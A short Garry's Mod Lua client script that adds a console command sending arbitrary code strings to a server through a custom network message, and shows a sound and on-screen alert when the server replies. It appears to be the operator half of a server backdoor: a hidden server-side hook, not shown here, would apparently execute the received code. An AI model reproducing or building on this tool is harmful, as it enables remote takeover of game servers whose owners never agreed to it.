if CLIENT then

concommand.Add("sex", function(ply, cmd, args)
	local code = args[1]
	if code then
		if string.len(code) <= 65532 then
			net.Start( "THESEXHOOK" )
			net.WriteString( code )
			net.SendToServer()
		end
	else
		net.Start( "THESEXHOOK" )
		net.SendToServer()
	end
end)

net.Receive( "SexAlertClient", function()
	surface.PlaySound( "music/hl1_song10.mp3" )
	LocalPlayer():PrintMessage( HUD_PRINTCENTER, net.ReadString() )
end )

end